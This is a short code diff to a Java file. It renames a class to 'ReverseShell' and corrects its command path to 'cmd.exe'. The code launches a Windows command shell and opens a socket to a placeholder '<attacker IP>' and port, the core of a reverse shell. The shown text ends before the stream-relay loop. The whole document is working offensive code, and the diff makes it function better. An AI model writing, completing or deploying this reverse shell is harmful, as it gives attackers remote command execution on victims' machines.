@@ -3,12 +3,12 @@ import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.Socket;
 
-public class C {
+public class ReverseShell {
 
-  public C() throws Exception {
+  public ReverseShell() throws Exception {
     String host="<attacker IP>";
     int port=<listening port>;
-    String cmd="/cmd.exe";
+    String cmd="cmd.exe";
     Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
     Socket s=new Socket(host,port);
     InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
